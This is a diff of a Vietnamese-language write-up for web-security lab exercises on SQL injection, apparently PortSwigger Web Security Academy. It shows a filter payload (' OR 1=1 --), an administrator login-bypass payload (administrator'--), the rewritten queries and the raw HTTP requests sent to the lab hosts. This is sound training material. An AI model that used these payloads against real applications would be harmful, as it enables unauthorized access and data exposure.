@@ -51,18 +51,44 @@ Payload:
 ```
 
 Câu truy vấn sẽ được thay thế thành:
-
 ```sql
 SELECT * FROM products WHERE category = '' OR 1=1 --' AND released = 1
 ```
 
 Request:
+
 ```http
 GET /filter?category='+OR+1%3d1+-- HTTP/2
 Host: 0aa400cc04b07ef3818389f900dd00df.web-security-academy.net
 ```
 
+### Lab: SQL injection vulnerability allowing login bypass
+> Mục tiêu: Thực hiện một cuộc tấn công tiêm SQL đăng nhập vào ứng dụng với tư cách là `administrator`.
 
+Phòng thí nghiệm này chứa lỗ hổng tiêm SQL trong chức năng đăng nhập, ứng dụng sẽ thực hiện truy vấn SQL như sau:
+
+```sql
+SELECT * FROM users WHERE username = 'usenname' AND password = 'password'
+```
+
+Payload:
+```
+administrator'--
+```
+
+Câu truy vấn sẽ được thay thế thành:
+```sql
+SELECT * FROM users WHERE username = 'administrator' --' AND password = 'password'
+```
+
+Request:
+
+```http
+POST /login HTTP/2
+Host: 0aca001104f9e33981f77a9d001f003c.web-security-academy.net
+
+csrf=FeKN7j0LMwFrA9s7ph9bXzk0ZcoxiAIZ&username=administrator%27+--&password=abc
+```
 
 ---
 Goodluck! 🍀🍀🍀
